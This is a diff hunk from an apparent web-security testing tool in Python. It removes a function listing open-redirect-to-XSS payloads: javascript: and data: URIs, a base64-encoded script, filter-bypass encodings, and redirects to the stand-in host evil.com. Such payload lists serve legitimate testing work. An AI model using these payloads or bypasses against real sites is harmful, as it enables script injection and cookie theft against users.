@@ -324,23 +324,3 @@ def build_poc_link(
     sep = "&" if "?" in target_url else "?"
     poc_url = f"{target_url}{sep}{urlencode({param: payload})}"
     return f'<a href="{poc_url}">click</a>'
-
-
-def dangerous_payloads() -> list[str]:
-    """High-yield payloads for Open-Redirect -> XSS testing."""
-    return [
-        # javascript: URI -- the primary XSS-via-redirect payload
-        "javascript:alert(1)",
-        "javascript:alert(document.cookie)",
-        "javascript:eval(atob('YWxlcnQoMSk='))",
-        # data: URI -- often accepted when javascript: is filtered
-        "data:text/html,<script>alert(1)</script>",
-        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-        # Protocol-relative -- bounces to an attacker host serving a script
-        "//evil.com/xss",
-        "https://evil.com/xss",
-        # Mixed-case / encoded bypasses for naive filters
-        "JaVaScRiPt:alert(1)",
-        "javascript&colon;alert(1)",
-        "javascript%3aalert(1)",
-    ]
